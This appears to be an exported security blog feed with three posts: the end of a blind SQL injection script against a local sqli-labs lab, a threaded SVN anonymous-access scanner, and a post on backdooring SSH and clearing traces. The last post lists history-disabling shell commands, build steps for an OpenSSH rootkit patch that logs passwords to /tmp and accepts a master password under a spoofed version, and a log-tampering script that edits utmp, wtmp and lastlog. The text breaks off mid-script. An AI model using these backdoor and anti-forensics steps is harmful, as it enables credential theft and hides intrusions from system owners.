string">'[%s] Start to retrive MySQL User:'</span> <span class="token operator">%</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%H:%M:%S'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>user <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token string">'ascii(mid(database(),%s,1))=%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20'</span> <span class="token operator">+</span> s<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">49639</span><span class="token punctuation">:</span>            user <span class="token operator">+=</span> payload            <span class="token keyword">print</span> <span class="token string">'\n[Scan in progress]'</span> <span class="token operator">+</span> user            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'.'</span><span class="token punctuation">,</span>            <span class="token keyword">print</span> <span class="token string">'http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'\n'</span>            <span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[Done]MySQL user is '</span> <span class="token operator">+</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断那里可以写返回的文本长度或者<code>r.content.find(&#39;something&#39;)&gt;0</code></p><p>根据sqlmap跑出来的payload，还有一种时间盲注可以查询数据，这种暂时还不会。<br>这是sqli-labs的第一节课，网上找到两个布尔盲注的，password没跑下来，不晓得什么个结果。</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SVN匿名扫描</title>
      <link href="/2016/04/15/svn-scan.html"/>
      <url>/2016/04/15/svn-scan.html</url>
      
        <content type="html"><![CDATA[<p>程序是最开始学习Python写的，基本是东拼西凑，从这个程序开始接触多进程。有两个版本第一种是直接使用<code>sock</code>的<code>connect</code>连接来判断，第二种使用了<code>scapy</code>，本着追求最快的程序，结果使用<code>scapy</code>比<code>socket</code>要慢好多。</p><p>下面是第一个程序，使用<code>socket</code>扫描:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*-coding:utf-8-*-</span><span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span>PIPE<span class="token keyword">import</span> re<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork<span class="token keyword">import</span> socket<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> osiplist <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> s<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3690</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>                <span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>                     <span class="token keyword">print</span> ip            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">try</span><span class="token punctuation">:</span>            svn_scan<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>       <span class="token keyword">finally</span><span class="token punctuation">:</span>            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span>iplist<span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后是使用了<code>scapy</code>的<code>syn</code>扫描：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span> <span class="token comment">#关闭import scapy的警告</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE<span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue<span class="token keyword">import</span> threadingconf<span class="token punctuation">.</span>verb <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#关闭输出</span>targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ans <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">elif</span> ans<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ans<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span>            sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"RA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> target<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>            out<span class="token punctuation">,</span> err <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span>   re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token punctuation">:</span>                <span class="token keyword">print</span> target<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        item <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            svn_scan<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">finally</span><span class="token punctuation">:</span>            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span> targets<span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>====2017-12-15更新</p><p>关于多线程，上面两个的<code>q.join</code>写错了，删掉之后改为:</p><pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.join(), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描<code>/24</code>的主机，花费的时间从8s变为了0.5s，时间不是这么计算的。</p><p>如果上面没有设置线程的daemon，最后运行的时候会一直卡着，因为进程默认不会停的，要这样:</p><pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.setDaemon(True), threads)map(lambda x: x.start(), threads)map(lambda x: x.join(3), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后的几句修改为上面的样子才是终极形态：</p><ol><li>设置了daemon，这样程序在子线程结束之后才回正常结束</li><li>join设置了超时时间，因为有时候线程会出现生产者没有，消费者等待（也就是消费者阻塞了）的情况，相当于设置了一个等待超时时间，如果不设置，消费者就会一直阻塞。</li></ol><p>Python里面，当线程比较多的时候，线程的切换是一件十分耗时的工作，但是python里面提供了一个比较好玩的东西，协程来解决这个问题</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH后门和清除痕迹</title>
      <link href="/2016/04/13/clear-ssh-history.html"/>
      <url>/2016/04/13/clear-ssh-history.html</url>
      
        <content type="html"><![CDATA[<p>对于SSH来说，登录主机之后先执行：<br><code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace </code></p><p>然后是SSH留后门的方法<a href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>简单来说就是以下的代码：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y openssl openssl-devel pam-develhttp://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gzhttp://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz<span class="token function">tar</span> zxvf openssh-5.9p1.tar.gz   <span class="token function">tar</span> zxvf 0x06-openssh-5.9p1.patch.tar.gz   <span class="token builtin class-name">cd</span> openssh-5.9p1.patch/   <span class="token function">cp</span> sshbd5.9p1.diff <span class="token punctuation">..</span>/openssh-5.9p1   <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/openssh-5.9p1   patch <span class="token operator">&lt;</span> sshbd5.9p1.diff   //patch  后门执行vi includes.h+<span class="token comment">#define ILOG "/tmp/ilog" //记录登录到本机的用户名和密码</span>+<span class="token comment">#define OLOG "/tmp/olog" //记录本机登录到远程的用户名和密码</span>+<span class="token comment">#define SECRETPW "123456654321" //你后门的密码</span>执行vi version.h<span class="token comment">#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"</span><span class="token comment">#define SSH_PORTABLE "小版本号"</span>./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc/ssh --with-pam --with-kerberos5<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> <span class="token function">service</span> sshd restart //重启sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p><p>接下来删除登录的历史记录，使用<a href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>代码复制过来：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python </span><span class="token keyword">import</span> os<span class="token punctuation">,</span> struct<span class="token punctuation">,</span> sys<span class="token keyword">from</span> pwd <span class="token keyword">import</span> getpwnam<span class="token keyword">from</span> time <span class="token keyword">import</span> strptime<span class="token punctuation">,</span> mktime<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser UTMPFILE <span class="token operator">=</span> <span class="token string">"/var/run/utmp"</span>WTMPFILE <span class="token operator">=</span> <span class="token string">"/var/log/wtmp"</span>LASTLOGFILE <span class="token operator">=</span> <span class="token string">"/var/log/lastlog"</span> LAST_STRUCT <span class="token operator">=</span> <span class="token string">'I32s256s'</span>LAST_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">)</span> XTMP_STRUCT <span class="token operator">=</span> <span class="token string">'hi32s4s32s256shhiii4i20x'</span>XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">getXtmp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>    xtmp <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token builtin">bytes</span> <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span>XTMP_STRUCT_SIZE<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>             data <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>            record <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> record<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            xtmp <span class="token operator">+=</span> <span class="token builtin">bytes</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> xtmp  <span class="token keyword">def</span> <span class="token function">modifyLast</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> strtime<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        showMessage<span class="token punctuation">(</span><span class="token string">'No such user.'</span><span class="token punctuation">)</span>     timestamp <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        str2time <span class="token operator">=</span> strptime<span class="token punctuation">(</span>strtime<span class="token punctuation">,</span> <span class="token string">'%Y:%m:%d:%H:%M:%S'</span><span class="token punctuation">)</span>        timestamp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mktime<span class="token punctuation">(</span>str2time<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        showMessage<span class="token punctuation">(</span><span class="token string">'Time format err.'</span><span class="token punctuation">)</span>     data <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>        fp<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>LAST_STRUCT_SIZE <span class="token operator">*</span> p<span class="token punctuation">.</span>pw_uid<span class="token punctuation">)</span>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span>  <span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> msg    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">saveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>contents<span class="token punctuation">)</span>    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        showMessage<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    usage <span class="token operator">=</span> 'usage<span class="token punctuation">:</span> logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">2</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span>\n \        logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">3</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span> <span class="token operator">-</span>t tty1 <span class="token operator">-</span>d <span class="token number">2015</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">12</span>'    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'MODE'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'1'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--ttyname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TTYNAME'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--filename'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'FILENAME'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--username'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'USERNAME'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--hostname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'HOSTNAME'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--dateline'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'DATELINE'</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> UTMPFILE             <span class="token comment"># tamper</span>            newData <span 